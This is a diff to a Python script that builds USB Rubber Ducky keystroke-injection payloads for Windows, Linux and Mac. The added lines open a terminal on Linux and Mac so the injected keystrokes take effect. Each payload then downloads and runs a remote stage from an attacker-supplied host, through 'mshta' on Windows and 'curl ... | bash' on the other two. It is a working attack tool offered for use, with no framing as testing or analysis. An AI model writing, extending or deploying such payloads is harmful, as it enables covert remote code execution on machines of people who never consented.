@@ -1,20 +1,29 @@
 import sys
 
 def generate_ducky(ip, port, delay_ms, output_path, os_type):
-    if os_type.lower() == 'windows':
+    os_type = os_type.lower()
+
+    if os_type == 'windows':
         ducky = f"""DELAY {delay_ms}
 GUI r
 DELAY 400
 STRING mshta http://{ip}:{port}/decrypt.html
 ENTER
 """
-    elif os_type.lower() == 'linux':
+    elif os_type == 'linux':
         ducky = f"""DELAY {delay_ms}
+CTRL ALT t
+DELAY 500
 STRING bash -c 'curl http://{ip}:{port}/final_stage1.sh | bash'
 ENTER
 """
-    elif os_type.lower() == 'mac':
+    elif os_type == 'mac':
         ducky = f"""DELAY {delay_ms}
+GUI space
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
 STRING osascript -e 'do shell script "curl http://{ip}:{port}/final_stage1.sh | bash"'
 ENTER
 """
@@ -36,3 +45,4 @@ if __name__ == "__main__":
     os_type = sys.argv[5]
 
     generate_ducky(ip, port, delay, output, os_type)
+    print(f"Generated Ducky script for {os_type} at {output}")
